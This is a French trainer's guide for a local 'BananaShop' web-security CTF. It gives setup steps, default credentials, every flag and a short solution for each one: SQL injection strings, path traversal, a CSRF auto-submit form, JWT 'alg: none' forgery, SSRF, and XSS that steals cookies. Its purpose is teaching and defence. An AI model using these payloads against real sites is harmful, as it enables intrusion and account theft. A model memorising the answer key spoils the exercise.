# Guide Formateur — MidHack BananaShop CTF

Document réservé aux formateurs. **Ne pas partager avec les participants.**

## Avant l'atelier

### Prérequis techniques

- Docker et Docker Compose installés
- Un écran/projecteur pour le dashboard live
- Chaque équipe a besoin d'un navigateur avec Burp Suite Community installé

### Lancement

```bash
docker compose up --build
```

Vérifier que tous les services sont accessibles :

| Service | URL | Vérification |
|---------|-----|--------------|
| Dashboard | <http://localhost:5000> | Le tableau de scores s'affiche |
| Site Team 1 | <http://localhost:3001> | La boutique BananaShop s'affiche |
| Site Team 2 | <http://localhost:3002> | Idem |
| Site Team 3 | <http://localhost:3003> | Idem |
| Site Team 4 | <http://localhost:3004> | Idem |
| Exploit Team 1 | <http://localhost:4001> | Page de login |
| Exploit Team 2 | <http://localhost:4002> | Idem |
| Exploit Team 3 | <http://localhost:4003> | Idem |
| Exploit Team 4 | <http://localhost:4004> | Idem |

### Mots de passe des serveurs d'exploit

| Équipe | Nom | Port | Mot de passe |
|--------|-----|------|--------------|
| Team 1 | Alpha | 4001 | `team1-banana` |
| Team 2 | Bravo | 4002 | `team2-banana` |
| Team 3 | Charlie | 4003 | `team3-banana` |
| Team 4 | Delta | 4004 | `team4-banana` |

### Comptes utilisateurs sur le site

| Utilisateur | Mot de passe | Rôle | Notes |
|-------------|-------------|------|-------|
| `admin` | `SuperSecretAdmin123!` | admin | Compte admin principal |
| `john` | `john123` | user | Compte utilisateur standard |
| `flag_holder` | `unfindable_password_42!` | user | Bio contient le flag IDOR |

### Secret JWT

Le secret JWT est `secret` (chaîne littérale). Le serveur accepte les algorithmes `HS256` et `none`.

---

## Déroulement de l'atelier (2h)

### Phase 1 — Introduction (15 min)

1. Présenter le contexte : sécurité offensive, OWASP Top 10
2. Montrer les outils : DevTools, Burp Suite, extension JWT de Burp
3. Distribuer les accès (URL du site + mot de passe exploit-server) à chaque équipe
4. Expliquer les règles : chaque flag trouvé rapporte des points, les indices coûtent -3 pts
5. **Lancer le timer** depuis le dashboard (voir section ci-dessous)

### Phase 2 — CTF libre (1h30)

- Les équipes exploitent les vulnérabilités à leur rythme
- Le dashboard projète le scoreboard en temps réel
- Les participants peuvent consulter l'Académie dans leur serveur d'exploit
- Circuler entre les équipes pour débloquer si besoin (donner des indices oraux)

### Phase 3 — Debrief (15 min)

- Walkthrough de chaque vulnérabilité avec les participants
- Montrer le code vulnérable vs. le code corrigé (onglet "Fix-It" du serveur d'exploit)
- Discuter des remédiations et bonnes pratiques

### Phase 4 — Démo CSRF en live (5-10 min)

Terminer l'atelier par une démonstration concrète d'attaque CSRF pour marquer les esprits.

1. **Préparer la démo** : sur le serveur d'exploit d'une équipe, créer une page HTML piégée contenant un formulaire caché qui effectue un transfert de crédits :

   ```html
   <h1>🎁 Vous avez gagné des bananes gratuites !</h1>
   <form id="csrf" action="http://localhost:3001/api/credits/send" method="POST">
     <input type="hidden" name="toUserId" value="1" />
     <input type="hidden" name="amount" value="500" />
   </form>
   <script>document.getElementById('csrf').submit();</script>
   ```

2. **Scénario** : se connecter en tant que `john` sur le site BananaShop, puis ouvrir la page piégée dans un autre onglet du même navigateur
3. **Résultat** : montrer que le transfert s'exécute sans aucune action de la victime, car le cookie de session est envoyé automatiquement et aucun token CSRF ne protège l'endpoint
4. **Leçon** : expliquer les protections (token CSRF synchronisé, attribut `SameSite` sur les cookies, vérification de l'en-tête `Origin`/`Referer`)

---

## Contrôle du timer

Depuis un terminal ou Burp Suite :

```bash
# Démarrer le timer (ex: 90 minutes)
curl -X POST http://localhost:5000/api/timer/start \
  -H "Content-Type: application/json" \
  -d '{"duration": 90}'

# Arrêter le timer
curl -X POST http://localhost:5000/api/timer/stop

# Voir l'état du timer
curl http://localhost:5000/api/timer
```

---

## Réinitialisation

### Réinitialiser une équipe (base de données)

Chaque équipe a sa propre base de données SQLite. Pour réinitialiser :

```bash
# Identifier le conteneur de l'équipe
docker compose exec site-team1 rm /app/server/banana_shop.db

# Redémarrer le service
docker compose restart site-team1
```

La base sera recréée automatiquement au démarrage avec les données initiales.

### Réinitialiser le scoreboard

```bash
# Supprimer les données du dashboard
docker compose exec dashboard rm /app/data/scoreboard.json

# Redémarrer le dashboard
docker compose restart dashboard
```

### Réinitialiser tout

```bash
docker compose down
docker compose up --build
```

### Réinitialisation en développement local

```bash
# Supprimer la base de données
rm server/banana_shop.db

# Supprimer le scoreboard
rm dashboard/data/scoreboard.json

# Relancer
npm run dev
```

---

## Liste complète des flags

| # | ID | Flag | Difficulté | Points |
|---|----|------|------------|--------|
| 1 | DATA_EXPOSURE | `ASY{4h_c3_f4m3ux_3ndp01nt_0ubl13}` | Facile | 10 |
| 2 | IDOR | `ASY{pr0f1l_v0l3_s4ns_4ut0r1s4t10n}` | Facile | 10 |
| 4 | PATH_TRAVERSAL | `ASY{tr4v3rs4l_f1ch13r_s3cr3t}` | Facile | 10 |
| 5 | ZERO_RATING | `ASY{z3r0_3t01l3s_v4l1d4t10n_byp4ss}` | Facile | 10 |
| 6 | REFLECTED_XSS | `ASY{r3ch3rch3_p13g33_p4r_l3_scr1pt}` | Facile-Moyen | 15 |
| 7 | SQLI | `ASY{4dm1n_s4ns_m0t_d3_p4ss3}` | Moyen | 15 |
| 8 | BUSINESS_LOGIC | `ASY{b4nqu13r_4ux_cr3d1ts_1nf1n1s}` | Moyen | 15 |
| 9 | MASS_ASSIGNMENT | `ASY{m4ss_4ss1gn_r0l3_4dm1n}` | Moyen | 15 |
| 10 | CSRF | `ASY{csrf_tr4nsf3rt_f0rc3}` | Moyen | 15 |
| 11 | JWT_FORGING | `ASY{j3t0n_f0rg3_4cc3s_t0t4l}` | Moyen-Difficile | 15 |
| 12 | SQLI_UNION | `ASY{un10n_s3l3ct_s3cr3ts_3xtr41ts}` | Difficile | 20 |
| 13 | STORED_XSS | `ASY{4v1s_emp01s0nn3_p4g3_p13g33}` | Difficile | 20 |
| 14 | SSRF | `ASY{ssrf_r3qu3t3_1nt3rn3}` | Difficile | 20 |
| 15 | COOKIE_THEFT | `ASY{c00k13_v0l3_xss_c0mpl3t}` | Difficile | 20 |

**Total : 220 points** (sans pénalités d'indices)

---

## Résolution rapide de chaque flag

### 1. Sensitive Data Exposure (Facile)

```
GET /api/config
```

Endpoint de debug oublié qui expose le secret JWT et les credentials admin.

### 2. IDOR (Facile)

```
GET /api/users/3
```

Accéder au profil de `flag_holder` (ID 3) sans vérification d'autorisation. Le flag est dans sa bio.

### 4. Path Traversal (Facile)

```
GET /api/products/image?file=../../secret_flag.txt
```

Lecture de fichier arbitraire via traversée de répertoire.

### 5. (Review nulle) Zero Rating Bypass (Facile)

```bash
POST /api/products/1/reviews
Content-Type: application/json

{"content": "test", "rating": 0}
```

Le frontend limite à 1-5 mais l'API accepte 0.

### 6. Reflected XSS (Facile-Moyen)

Rechercher dans la boutique avec un payload HTML, puis appeler `/api/xss-flag?type=reflected` depuis le contexte XSS.

### 7. SQL Injection — Login Bypass (Moyen)

```
Username: admin' --
Password: (n'importe quoi)
```

Le `--` commente la vérification du mot de passe.

### 8. Business Logic (Moyen)

```bash
POST /api/credits/send
Content-Type: application/json

{"toUserId": 2, "amount": -5000}
```

Envoyer un montant négatif augmente le solde de l'expéditeur. Dépasser 9999 crédits pour obtenir le flag.

### 9. Mass Assignment (Moyen)

```bash
PUT /api/users/{id}
Content-Type: application/json

{"username": "...", "role": "admin"}
```

Le champ `role` est accepté sans vérification.

### 10. CSRF (Moyen)

Créer un formulaire sur le serveur d'exploit qui envoie un transfert de crédits. L'absence de token CSRF permet l'attaque.

### 11. JWT Forging (Moyen-Difficile)

Forger un JWT avec `alg: none` ou signer avec le secret `secret`, en ajoutant `super_admin: true`. Accéder à `/api/admin/dashboard`.

### 12. SQL Injection UNION (Difficile)

```
GET /api/products?search=' UNION SELECT 1,value,3,4,5,6 FROM secrets --
```

Extraction des données de la table `secrets`.

### 13. Stored XSS (Difficile)

Poster un avis avec du HTML malveillant (ex: `<img src=x onerror="...">`) puis appeler `/api/xss-flag?type=stored`.

### 14. SSRF (Difficile)

```bash
POST /api/products/1/image-url
Content-Type: application/json

{"url": "http://localhost:3000/api/internal/flag"}
```

Le serveur fetch l'URL interne et renvoie le flag.

### 15. Cookie Theft via XSS (Difficile)

Combiner une XSS (stored ou reflected) pour exfiltrer `document.cookie` vers le webhook du serveur d'exploit. Le serveur détecte automatiquement le JWT volé.

---

## Problèmes courants

| Problème | Solution |
|----------|----------|
| Le dashboard n'affiche pas les équipes | Les équipes s'enregistrent au démarrage de leur exploit-server. Vérifier que les conteneurs exploit sont lancés |
| Une équipe ne peut plus se connecter | Réinitialiser la base de données de l'équipe (voir section Réinitialisation) |
| Le timer ne se lance pas | Vérifier que le dashboard est accessible sur le port 5000 |
| Les flags ne sont pas validés | Vérifier la connexion entre exploit-server et dashboard (réseau Docker) |
| Port déjà utilisé | `docker compose down` puis relancer |
